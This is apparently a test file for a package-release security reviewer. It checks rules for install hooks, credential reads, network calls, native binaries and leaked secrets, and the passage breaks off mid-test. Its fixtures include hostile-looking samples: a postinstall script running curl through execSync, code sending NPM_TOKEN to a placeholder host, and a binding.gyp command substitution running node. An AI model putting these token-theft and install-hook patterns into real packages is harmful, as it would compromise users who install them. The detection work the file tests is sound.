import { describe, expect, test } from "vitest";
import {
  annotateFindingsWithDiffStatus,
  computeRisk,
  createPackageDiff,
  deterministicFindings,
  packageJsonDiffFindings,
  summarizePackageJsonDiff,
  tarSuspiciousEntryFindings,
} from "../server/lib/review.ts";

describe("review", () => {
  test("diff highlights added modified and removed package files", () => {
    const before = [
      {
        path: "package.json",
        size: 40,
        sha256: "a",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.0" }),
      },
      { path: "index.js", size: 10, sha256: "b", flags: [], textSample: "export {}" },
      { path: "old.js", size: 10, sha256: "c", flags: [], textSample: "" },
    ];
    const staged = [
      {
        path: "package.json",
        size: 70,
        sha256: "d",
        flags: [],
        textSample: JSON.stringify({
          name: "pkg",
          version: "1.0.1",
          scripts: { postinstall: "node install.js" },
        }),
      },
      { path: "index.js", size: 10, sha256: "b", flags: [], textSample: "export {}" },
      {
        path: "install.js",
        size: 30,
        sha256: "e",
        flags: [],
        textSample: "require('child_process').execSync('curl https://x')",
      },
    ];

    const diff = createPackageDiff(before, staged);

    expect(diff.find((entry) => entry.path === "install.js")?.status).toBe("added");
    expect(diff.find((entry) => entry.path === "package.json")?.status).toBe("modified");
    expect(diff.find((entry) => entry.path === "old.js")?.status).toBe("removed");
    expect(diff.find((entry) => entry.path === "index.js")?.status).toBe("unchanged");
  });

  test("diff treats skipped file content as modified when hashes are missing (legacy artifacts)", () => {
    const before = [
      {
        path: "bin/native.node",
        size: 50_000_000,
        sha256: "",
        flags: ["content-skipped"],
      },
    ];
    const staged = [
      {
        path: "bin/native.node",
        size: 50_000_000,
        sha256: "",
        flags: ["content-skipped"],
      },
    ];

    const diff = createPackageDiff(before, staged);

    expect(diff.find((entry) => entry.path === "bin/native.node")).toMatchObject({
      status: "modified",
      flags: ["content-skipped"],
    });
  });

  test("diff proves a skipped file unchanged when its streamed hashes match", () => {
    // Skipped bodies are hashed while being discarded, so equal real hashes
    // mean the uninspected binary is byte-identical to the published baseline.
    const hash = "a".repeat(64);
    const before = [
      { path: "bin/native.node", size: 50_000_000, sha256: hash, flags: ["content-skipped"] },
    ];
    const staged = [
      { path: "bin/native.node", size: 50_000_000, sha256: hash, flags: ["content-skipped"] },
    ];

    const diff = createPackageDiff(before, staged);

    expect(diff.find((entry) => entry.path === "bin/native.node")).toMatchObject({
      status: "unchanged",
      flags: ["content-skipped"],
    });
  });

  test("diff marks a skipped file modified when its streamed hashes differ", () => {
    const before = [
      {
        path: "bin/native.node",
        size: 50_000_000,
        sha256: "a".repeat(64),
        flags: ["content-skipped"],
      },
    ];
    const staged = [
      {
        path: "bin/native.node",
        size: 50_000_001,
        sha256: "b".repeat(64),
        flags: ["content-skipped"],
      },
    ];

    const diff = createPackageDiff(before, staged);

    expect(diff.find((entry) => entry.path === "bin/native.node")?.status).toBe("modified");
  });

  test("deterministic policy escalates risky new staged changes", () => {
    const staged = [
      {
        path: "package.json",
        size: 70,
        sha256: "d",
        flags: [],
        textSample: JSON.stringify({ scripts: { preinstall: "node install.js" } }),
      },
      {
        path: "install.js",
        size: 30,
        sha256: "e",
        flags: [],
        textSample: "process.env.NPM_TOKEN; new Function('return 1')",
      },
    ];
    const diff = createPackageDiff([], staged);
    const findings = deterministicFindings(staged, diff);

    expect(computeRisk(findings)).toBe("critical");
    expect(findings.some((finding) => finding.evidence.includes("preinstall"))).toBe(true);
    expect(findings.some((finding) => finding.evidence.includes("secret/environment access"))).toBe(
      true,
    );
  });

  test("escalates root gyp command substitution that executes package JavaScript", () => {
    const previous = [
      {
        path: "package.json",
        size: 42,
        sha256: "prev-package-json",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.0" }),
      },
    ];
    const staged = [
      {
        path: "package.json",
        size: 42,
        sha256: "staged-package-json",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
      {
        path: "binding.gyp",
        size: 157,
        sha256: "binding-gyp",
        flags: [],
        textSample:
          '{\n  "targets": [{\n    "target_name": "Setup",\n    "type": "none",\n    "sources": ["<!(node index.js > /dev/null 2>&1 && echo stub.c)"]\n  }]\n}\n',
      },
      {
        path: "index.js",
        size: 160,
        sha256: "index-js",
        flags: [],
        textSample:
          "eval(function rotate(payload) { return payload; }('defanged payload placeholder'));\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff(previous, staged));

    expect(computeRisk(findings)).toBe("critical");
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "install-script.implicit-node-gyp",
          severity: "high",
          file: "binding.gyp",
        }),
        expect.objectContaining({
          ruleId: "install-script.gyp-command-substitution",
          severity: "critical",
          file: "binding.gyp",
          line: 5,
        }),
      ]),
    );
  });

  test("flags extensionless native binaries via parser magic-byte flags with sha256 evidence", () => {
    // The Windows-skew regression: the .exe matched the extension check, but
    // the same release's extensionless Linux/macOS binaries were invisible.
    const staged = [
      {
        path: "bin/cli-windows-x64.exe",
        size: 23068672,
        sha256: "windows-pe-hash",
        flags: ["content-skipped", "native-pe"],
      },
      {
        path: "bin/cli-linux-x64",
        size: 22020096,
        sha256: "linux-elf-hash",
        flags: ["content-skipped", "native-elf"],
      },
      {
        path: "bin/cli-darwin-arm64",
        size: 20971520,
        sha256: "darwin-macho-hash",
        flags: ["content-skipped", "native-macho"],
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));
    const native = findings.filter((finding) => finding.ruleId === "file.native-artifact");

    expect(native).toHaveLength(3);
    expect(native).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          severity: "high",
          file: "bin/cli-linux-x64",
          evidence: "ELF executable (magic bytes); sha256 linux-elf-hash",
        }),
        expect.objectContaining({
          severity: "high",
          file: "bin/cli-darwin-arm64",
          evidence: "Mach-O executable (magic bytes); sha256 darwin-macho-hash",
        }),
        expect.objectContaining({
          severity: "high",
          file: "bin/cli-windows-x64.exe",
          evidence: "Windows PE/DOS executable (magic bytes); sha256 windows-pe-hash",
        }),
      ]),
    );
    // The oversized additions also raise diff.large-new-file with the staged hash.
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "diff.large-new-file",
          severity: "medium",
          file: "bin/cli-linux-x64",
          evidence: "22020096 byte new file; sha256 linux-elf-hash",
        }),
      ]),
    );
  });

  test("extension-matched native artifacts keep firing without magic flags and carry sha256", () => {
    const staged = [
      {
        path: "prebuilds/linux-x64/addon.node",
        size: 2048576,
        sha256: "addon-hash",
        flags: ["binary"],
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));
    const native = findings.filter((finding) => finding.ruleId === "file.native-artifact");

    expect(native).toHaveLength(1);
    expect(native[0]).toMatchObject({
      severity: "high",
      file: "prebuilds/linux-x64/addon.node",
      evidence: "native, wasm, or executable artifact; sha256 addon-hash",
    });
    // Extension + magic flag on the same file still yields a single finding.
    const flagged = deterministicFindings(
      [{ ...staged[0], flags: ["binary", "native-elf"] }],
      createPackageDiff([], [{ ...staged[0], flags: ["binary", "native-elf"] }]),
    );
    expect(flagged.filter((finding) => finding.ruleId === "file.native-artifact")).toHaveLength(1);
  });

  test("does not apply Python capability patterns to JavaScript packages", () => {
    const staged = [
      {
        path: "template.js",
        size: 60,
        sha256: "template",
        flags: [],
        textSample: "export function render(template) {\n  return compile(template);\n}\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId === "code.dynamic-evaluation")).toBe(false);
  });

  test("does not flag unchanged network-only code paths", () => {
    const previous = [
      {
        path: "link/http/createSignalIfSupported.js",
        size: 90,
        sha256: "apollo-http",
        flags: [],
        textSample: "export function createSignalIfSupported() {\n  return fetch('/graphql');\n}\n",
      },
    ];
    const staged = [...previous];
    const findings = deterministicFindings(staged, createPackageDiff(previous, staged), {
      name: "@apollo/client",
      version: "4.2.0",
    });

    expect(findings.some((finding) => finding.ruleId === "code.network-access")).toBe(false);
  });

  test("flags added network-only code paths as contextual", () => {
    const staged = [
      {
        path: "lib/update.js",
        size: 90,
        sha256: "network-only",
        flags: [],
        textSample:
          "import https from 'https';\nhttps.request('https://example.invalid/payload').end();\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.network-access",
          severity: "medium",
          file: "lib/update.js",
        }),
      ]),
    );
  });

  test("still flags network-capable lifecycle script files", () => {
    const staged = [
      {
        path: "package.json",
        size: 80,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ scripts: { postinstall: "node scripts/install" } }),
      },
      {
        path: "scripts/install.js",
        size: 90,
        sha256: "install",
        flags: [],
        textSample: "fetch('https://example.com/payload.js');\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.network-access",
          severity: "high",
          file: "scripts/install.js",
        }),
      ]),
    );
  });

  test("does not treat fetch method declarations as network access", () => {
    const previous = [
      {
        path: "core/ObservableQuery.js",
        size: 90,
        sha256: "old",
        flags: [],
        textSample:
          "export class ObservableQuery {\n  fetchPolicy() { return 'cache-first'; }\n}\n",
      },
    ];
    const staged = [
      {
        path: "core/ObservableQuery.js",
        size: 180,
        sha256: "new",
        flags: [],
        textSample:
          "export class ObservableQuery {\n  fetchPolicy() { return 'cache-first'; }\n  fetch(options, networkStatus, fetchQuery) {\n    return fetchQuery(options, networkStatus);\n  }\n}\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff(previous, staged));

    expect(findings.some((finding) => finding.ruleId === "code.network-access")).toBe(false);
  });

  test("does not scan documentation as executable capability evidence", () => {
    const staged = [
      {
        path: "CHANGELOG.md",
        size: 160,
        sha256: "changelog",
        flags: [],
        textSample:
          "Previously no AbortController was passed to `fetch()`, so the request kept running.\n",
      },
      {
        path: "skills/apollo-client/references/integration-client.md",
        size: 160,
        sha256: "skill-doc",
        flags: [],
        textSample:
          'const token = localStorage.getItem("token");\nauthorization: token ? `Bearer ${token}` : ""\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId?.startsWith("code."))).toBe(false);
    expect(findings.some((finding) => finding.ruleId === "file.secret-content")).toBe(false);
  });

  test("excludes type declaration files from content scanning", () => {
    // .d.ts files keep a diffable sample but must not drive deterministic
    // findings: declaration syntax like `fetch(...)` is a type signature, and
    // scanning large bundled declarations is pure perf/memory cost.
    const staged = [
      {
        path: "dist/index.d.ts",
        size: 200,
        sha256: "decl",
        flags: [],
        textSample:
          "export declare function run(): void;\n" +
          "export declare const fetch: (url: string) => Promise<Response>;\n" +
          "export declare const child_process: typeof import('child_process');\n" +
          "export declare const token: 'npm_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';\n",
      },
      {
        path: "dist/index.d.mts",
        size: 80,
        sha256: "decl-mts",
        flags: [],
        textSample: "export declare const exec: (cmd: string) => void;\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId?.startsWith("code."))).toBe(false);
    expect(findings.some((finding) => finding.ruleId === "file.secret-content")).toBe(false);
  });

  test("still flags high-confidence token leaks in documentation", () => {
    const staged = [
      {
        path: "README.md",
        size: 80,
        sha256: "readme-token",
        flags: [],
        textSample: "Do not publish this npm_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA token.\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "file.secret-content",
          file: "README.md",
        }),
      ]),
    );
  });

  test("still scans executable files with documentation-like basenames", () => {
    const staged = [
      {
        path: "security.js",
        size: 120,
        sha256: "security-script",
        flags: [],
        textSample:
          "const token = process.env.NPM_TOKEN;\nfetch('https://example.invalid', { body: token });\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.credential-access",
          file: "security.js",
        }),
        expect.objectContaining({
          ruleId: "code.network-access",
          file: "security.js",
        }),
      ]),
    );
  });

  test("does not treat common JS env flags as credential access", () => {
    const staged = [
      {
        path: "index.js",
        size: 180,
        sha256: "env-flags",
        flags: [],
        textSample:
          "const mode = process.env.NODE_ENV;\nif (import.meta.env.DEV || process.env['CI']) fetch('https://example.invalid/ping');\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId === "code.credential-access")).toBe(false);
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.network-access",
          severity: "medium",
          file: "index.js",
        }),
      ]),
    );
  });

  test("keeps credential finding lines stable when a multiline env access is stripped", () => {
    // The allowlist strip erases `process.env\n  .npm_command` across the line
    // break; if it also swallowed the newline, the authToken read below would be
    // reported at line 2 instead of its real line 3.
    const staged = [
      {
        path: "index.js",
        size: 92,
        sha256: "multiline-env",
        flags: [],
        textSample:
          "const a = process.env\n  .npm_command;\nconst b = process.env.npm_config__authToken;\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.find((finding) => finding.ruleId === "code.credential-access")).toMatchObject({
      severity: "high",
      file: "index.js",
      line: 3,
    });
  });

  test("still flags token reads next to common env flags", () => {
    const staged = [
      {
        path: "index.js",
        size: 180,
        sha256: "env-token",
        flags: [],
        textSample:
          "const mode = process.env.NODE_ENV;\nconst token = process.env['NPM_TOKEN'];\nfetch('https://example.invalid', { body: token || mode });\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.find((finding) => finding.ruleId === "code.credential-access")).toMatchObject({
      severity: "high",
      file: "index.js",
    });
  });

  test("does not flag placeholder URL credentials as secret content", () => {
    // requests' HISTORY.md CVE-2023-32681 entry (`http://user:pass@proxy`) is
    // the canonical benign hit: doc-style placeholder passwords are not leaks.
    const staged = [
      {
        path: "HISTORY.md",
        size: 160,
        sha256: "history",
        flags: [],
        textSample:
          "When proxies are defined with user info (`http://user:pass@proxy.example`),\n" +
          "a Proxy-Authorization header is constructed.\n",
      },
      {
        path: "lib/config.js",
        size: 120,
        sha256: "config",
        flags: [],
        textSample: 'const proxyExample = "https://user:<password>@registry.example.com";\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId === "file.secret-content")).toBe(false);
  });

  test("still flags URL credentials with a real-looking password", () => {
    const staged = [
      {
        path: "lib/config.js",
        size: 120,
        sha256: "config-real",
        flags: [],
        textSample: 'const upstream = "https://deploy:9f8a7b6c5d4e3f2a1b@registry.example.com";\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toContainEqual(
      expect.objectContaining({ ruleId: "file.secret-content", file: "lib/config.js" }),
    );
  });

  test("does not scan Python packaging metadata prose as capability evidence", () => {
    // PKG-INFO / .dist-info/METADATA embed the README long-description, so
    // capability regexes over them only re-flag documentation examples.
    const prose =
      "Metadata-Version: 2.3\nName: demo\nVersion: 1.0.0\n\nUsage:\n\n" +
      '    requests.get("https://api.example.invalid/status")\n\n' +
      "Reads proxy auth from os.environ or a .netrc file.\n";
    const staged = [
      { path: "sdist/PKG-INFO", size: 200, sha256: "pkginfo", flags: [], textSample: prose },
      {
        path: "sdist/src/.egg-info/PKG-INFO",
        size: 200,
        sha256: "egg",
        flags: [],
        textSample: prose,
      },
      {
        path: "wheel/py3-none-any/.dist-info/METADATA",
        size: 200,
        sha256: "meta",
        flags: [],
        textSample: prose,
      },
      {
        path: "wheel/py3-none-any/demo/client.py",
        size: 160,
        sha256: "client",
        flags: [],
        textSample:
          "import os\nimport requests\n\n\ndef send():\n" +
          '    return requests.get("https://api.example.invalid", params={"k": os.environ.get("D")})\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), null, {
      codePatternSet: "python",
    });
    const codeFindingFiles = new Set(
      findings.filter((finding) => finding.ruleId?.startsWith("code.")).map((f) => f.file),
    );

    expect(codeFindingFiles.has("sdist/PKG-INFO")).toBe(false);
    expect(codeFindingFiles.has("sdist/src/.egg-info/PKG-INFO")).toBe(false);
    expect(codeFindingFiles.has("wheel/py3-none-any/.dist-info/METADATA")).toBe(false);
    // Real package code with the same capabilities still flags.
    expect(codeFindingFiles.has("wheel/py3-none-any/demo/client.py")).toBe(true);
  });

  test("demotes secret-looking content in unreachable test files", () => {
    const staged = [
      {
        path: "test/fixtures/server.key",
        size: 160,
        sha256: "test-key",
        flags: [],
        textSample: "-----BEGIN PRIVATE KEY-----\nTESTFIXTUREONLY\n-----END PRIVATE KEY-----\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toContainEqual(
      expect.objectContaining({
        ruleId: "file.secret-content",
        file: "test/fixtures/server.key",
        // Added files flag critical; the test-scope demotion steps it to high.
        severity: "high",
        testScoped: true,
        evidence: expect.stringContaining("test-scoped"),
      }),
    );
  });

  test("does not flag secret-looking source map content", () => {
    // The tar parser strips text samples from .map files (shouldSkipTextSample),
    // so deterministic rules never see source-map contents.
    const staged = [
      {
        path: "core/index.js.map",
        size: 120,
        sha256: "map",
        flags: ["text-sample-skipped"],
      },
      {
        path: "config.js",
        size: 80,
        sha256: "secret",
        flags: [],
        textSample: "export const config = { password: 'abc!def@ghi#jkl' };\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(
      findings.some(
        (finding) =>
          finding.ruleId === "file.secret-content" && finding.file === "core/index.js.map",
      ),
    ).toBe(false);
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "file.secret-content",
          file: "config.js",
        }),
      ]),
    );
  });

  test("does not treat importlib.metadata as Python dynamic evaluation", () => {
    const staged = [
      {
        path: "demo_package/_version.py",
        size: 90,
        sha256: "version",
        flags: [],
        textSample:
          'from importlib.metadata import version\n__version__ = version("demo-package")\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), null, {
      codePatternSet: "python",
    });

    expect(findings.some((finding) => finding.ruleId === "code.dynamic-evaluation")).toBe(false);
  });

  test("detects Python dynamic import execution", () => {
    const staged = [
      {
        path: "demo_package/loader.py",
        size: 90,
        sha256: "loader",
        flags: [],
        textSample: 'import importlib\nplugin = importlib.import_module("demo_package.plugin")\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), null, {
      codePatternSet: "python",
    });

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.dynamic-evaluation",
          file: "demo_package/loader.py",
        }),
      ]),
    );
  });

  test("adds best-effort line numbers and diff annotations to findings", () => {
    const before = [
      {
        path: "index.js",
        size: 20,
        sha256: "old",
        flags: [],
        textSample: "export const value = 1;\n",
      },
    ];
    const staged = [
      {
        path: "package.json",
        size: 120,
        sha256: "pkg",
        flags: [],
        textSample: `{
  "name": "pkg",
  "scripts": {
    "postinstall": "node install.js"
  }
}`,
      },
      {
        path: "index.js",
        size: 80,
        sha256: "new",
        flags: [],
        textSample: "export const value = 1;\nfetch('/debug');\n",
      },
    ];
    const diff = createPackageDiff(before, staged);
    const findings = deterministicFindings(staged, diff);

    expect(findings).toContainEqual(
      expect.objectContaining({
        file: "package.json",
        evidence: "postinstall: node install.js",
        line: 4,
      }),
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        file: "index.js",
        evidence: "new/changed modified file: network-capable code path",
        line: 2,
      }),
    );

    const annotated = annotateFindingsWithDiffStatus(findings, diff);
    expect(annotated.find((finding) => finding.file === "index.js")).toMatchObject({
      diffStatus: "modified",
      releaseDelta: true,
    });
    expect(annotated.find((finding) => finding.file === "package.json")).toMatchObject({
      diffStatus: "added",
      releaseDelta: true,
    });
  });

  test("keeps modified-file findings contextual when the finding line did not change", () => {
    const previous = [
      {
        path: "src/server.ts",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "fetch('/existing-risk');\nexport const value = 1;\n",
      },
    ];
    const staged = [
      {
        path: "src/server.ts",
        size: 60,
        sha256: "new",
        flags: [],
        textSample: "fetch('/existing-risk');\nexport const value = 2;\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          id: "existing-risk",
          severity: "medium",
          file: "src/server.ts",
          line: 1,
          evidence: "network-capable code path",
          reason: "existing network path",
        },
        {
          id: "changed-line",
          severity: "medium",
          file: "src/server.ts",
          line: 2,
          evidence: "changed value",
          reason: "changed release line",
        },
      ],
      diff,
      { previousFiles: previous, stagedFiles: staged },
    );

    expect(annotated.find((finding) => finding.id === "existing-risk")).toMatchObject({
      diffStatus: "modified",
      releaseDelta: false,
    });
    expect(annotated.find((finding) => finding.id === "changed-line")).toMatchObject({
      diffStatus: "modified",
      releaseDelta: true,
    });
  });

  test("keeps modified-file findings release scoped when a later matching line changed", () => {
    const previous = [
      {
        path: "src/server.ts",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "fetch('/existing-risk');\nexport const value = 1;\n",
      },
    ];
    const staged = [
      {
        path: "src/server.ts",
        size: 90,
        sha256: "new",
        flags: [],
        textSample:
          "fetch('/existing-risk');\nexport const value = 1;\nfetch('https://example.invalid/new-risk');\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff);
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });

    expect(annotated.find((finding) => finding.ruleId === "code.network-access")).toMatchObject({
      line: 1,
      diffStatus: "modified",
      releaseDelta: true,
    });
  });

  test("uses Python annotation patterns for extensionless modified files", () => {
    const previous = [
      {
        path: "scripts/post_install",
        size: 100,
        sha256: "old",
        flags: [],
        textSample:
          "import urllib.request\nurllib.request.urlopen('https://example.invalid/existing')\nvalue = 1\n",
      },
    ];
    const staged = [
      {
        path: "scripts/post_install",
        size: 160,
        sha256: "new",
        flags: [],
        textSample:
          "import urllib.request\nurllib.request.urlopen('https://example.invalid/existing')\nvalue = 2\nurllib.request.urlopen('https://example.invalid/new')\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff, null, { codePatternSet: "python" });
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
      codePatternSet: "python",
    });

    expect(annotated.find((finding) => finding.ruleId === "code.network-access")).toMatchObject({
      file: "scripts/post_install",
      line: 1,
      diffStatus: "modified",
      releaseDelta: true,
    });
  });

  test("keeps PyPI adapter findings release scoped even when paths use artifact namespaces", () => {
    const diff = [
      {
        path: "wheel/py3-none-any/sitecustomize.py",
        status: "added",
        stagedSize: 7,
        stagedSha256: "hook",
        flags: [],
      },
    ];
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          severity: "high",
          file: "dist/demo_package-1.2.0-py3-none-any.whl/sitecustomize.py",
          evidence: "sitecustomize.py runs automatically on interpreter startup",
          reason: "startup hook",
          ruleId: "pypi.startup-hook",
        },
      ],
      diff,
    );

    expect(annotated[0]).toMatchObject({
      diffStatus: "unknown",
      releaseDelta: true,
    });
  });

  test("keeps VS Code adapter findings release scoped on an unchanged file with a baseline", () => {
    const unchangedFile = {
      path: "out/extension.js",
      size: 40,
      sha256: "same",
      textSample: "exports.activate = () => require('vm').runInThisContext(x);",
      flags: [],
    };
    const diff = [{ path: "out/extension.js", status: "unchanged" }];
    // A VSIX with a marketplace baseline whose flagged file did not change since
    // the last release. The finding is a property of the release, not a line
    // diff, so it must stay release-scoped instead of falling through to a
    // releaseDelta: false diff annotation that understates releaseRisk.
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          severity: "high",
          file: "out/extension.js",
          line: 1,
          evidence: "activation loads a WebAssembly module on startup",
          reason: "startup wasm loader",
          ruleId: "vscode.startup-wasm-loader",
        },
      ],
      diff,
      {
        codePatternSet: "javascript",
        previousFiles: [unchangedFile],
        stagedFiles: [unchangedFile],
      },
    );

    expect(annotated[0]).toMatchObject({
      diffStatus: "unchanged",
      releaseDelta: true,
    });
  });

  test("package json diff summarizes release-review sensitive fields", () => {
    const summary = summarizePackageJsonDiff(
      {
        name: "pkg",
        version: "1.0.0",
        scripts: {},
        dependencies: { a: "1.0.0" },
        main: "index.js",
      },
      {
        name: "pkg",
        version: "1.0.1",
        scripts: { postinstall: "node install.js" },
        dependencies: { a: "1.1.0", b: "2.0.0" },
        main: "dist/index.js",
      },
    );

    expect(summary.previousVersion).toBe("1.0.0");
    expect(summary.stagedVersion).toBe("1.0.1");
    expect(summary.scripts).toEqual([
      { key: "postinstall", status: "added", staged: "node install.js" },
    ]);
    expect(summary.entrypointsChanged).toBe(true);
  });

  test("diffs bin commands and flags newly added executables", () => {
    const objectForm = summarizePackageJsonDiff(
      { name: "tool", version: "1.0.0" },
      { name: "tool", version: "1.0.1", bin: { tool: "cli.js", helper: "helper.js" } },
    );
    expect(objectForm.bin).toEqual([
      { key: "helper", status: "added", staged: "helper.js" },
      { key: "tool", status: "added", staged: "cli.js" },
    ]);

    // A string bin installs one command named after the package (unscoped part).
    const stringForm = summarizePackageJsonDiff(
      { name: "@scope/tool", version: "1.0.0" },
      { name: "@scope/tool", version: "1.0.1", bin: "cli.js" },
    );
    expect(stringForm.bin).toEqual([{ key: "tool", status: "added", staged: "cli.js" }]);

    expect(packageJsonDiffFindings(objectForm)).toEqual([
      expect.objectContaining({
        ruleId: "diff.bin-added",
        severity: "medium",
        evidence: "bin helper: helper.js",
      }),
      expect.objectContaining({
        ruleId: "diff.bin-added",
        severity: "medium",
        evidence: "bin tool: cli.js",
      }),
    ]);

    // A bin command whose target only moves (build-path churn) is not flagged.
    const retarget = summarizePackageJsonDiff(
      { name: "tool", version: "1.0.0", bin: { tool: "cli.js" } },
      { name: "tool", version: "1.0.1", bin: { tool: "dist/cli.js" } },
    );
    expect(retarget.bin).toEqual([
      { key: "tool", status: "modified", previous: "cli.js", staged: "dist/cli.js" },
    ]);
    expect(packageJsonDiffFindings(retarget)).toEqual([]);
  });

  test("flags unusual dependency specs in package json diffs", () => {
    const diff = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { safe: "^1.0.0" } },
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: {
          safe: "github:example/safe#main",
          remote: "https://example.invalid/pkg.tgz",
          local: "file:../local.tgz",
          alias: "npm:other-package@^1.0.0",
        },
      },
    );

    const findings = packageJsonDiffFindings(diff);

    expect(findings).toEqual([
      expect.objectContaining({
        severity: "high",
        file: "package.json",
        evidence: "alias: npm:other-package@^1.0.0",
        ruleId: "dependency.unusual-spec",
      }),
      expect.objectContaining({
        evidence: "local: file:../local.tgz",
        ruleId: "dependency.unusual-spec",
      }),
      expect.objectContaining({
        evidence: "remote: https://example.invalid/pkg.tgz",
        ruleId: "dependency.unusual-spec",
      }),
      expect.objectContaining({
        evidence: "safe: github:example/safe#main",
        ruleId: "dependency.unusual-spec",
      }),
    ]);
    expect(
      packageJsonDiffFindings({
        ...diff,
        dependencies: [{ key: "safe", status: "added", staged: "^1.0.0" }],
      }),
    ).toEqual([]);
  });

  test("flags files outside package.json files allowlist", () => {
    const staged = [
      {
        path: "package.json",
        size: 72,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1", files: ["dist"] }),
      },
      { path: "dist/index.js", size: 20, sha256: "dist", flags: [], textSample: "export {};" },
      {
        path: "router_init.js",
        size: 2048,
        sha256: "payload",
        flags: [],
        textSample: "console.log('init');",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        file: "router_init.js",
        evidence: "new/changed added file: file is not matched by package.json files allowlist",
        ruleId: "file.outside-files-list",
      }),
    );
    expect(findings).not.toContainEqual(
      expect.objectContaining({ file: "dist/index.js", ruleId: "file.outside-files-list" }),
    );
  });

  test("does not flag prepare as a consumer install lifecycle hook", () => {
    const staged = [
      {
        path: "package.json",
        size: 120,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({
          name: "pkg",
          version: "1.0.1",
          scripts: { prepare: "husky && npm run test:install && run-s build" },
        }),
      },
    ];

    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).not.toContainEqual(
      expect.objectContaining({ ruleId: "install-script.lifecycle" }),
    );
  });

  test("matches glob entries in package.json files allowlist", () => {
    const staged = [
      {
        path: "package.json",
        size: 77,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1", files: ["dist/*.js"] }),
      },
      { path: "dist/index.js", size: 20, sha256: "dist-js", flags: [], textSample: "export {};" },
      { path: "dist/style.css", size: 9, sha256: "dist-css", flags: [], textSample: "body {}" },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toContainEqual(
      expect.objectContaining({ file: "dist/style.css", ruleId: "file.outside-files-list" }),
    );
    expect(findings).not.toContainEqual(
      expect.objectContaining({ file: "dist/index.js", ruleId: "file.outside-files-list" }),
    );
  });

  test("flags newly added optional dependencies", () => {
    const stagedPackageJsonText = `{
  "name": "pkg",
  "version": "1.0.1",
  "optionalDependencies": {
    "existing": "^1.0.0",
    "maybe": "^2.0.0"
  }
}`;
    const diff = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", optionalDependencies: { existing: "^1.0.0" } },
      JSON.parse(stagedPackageJsonText),
    );

    const findings = packageJsonDiffFindings(diff, stagedPackageJsonText);

    expect(diff.dependencies).toContainEqual({
      key: "maybe",
      status: "added",
      staged: "^2.0.0",
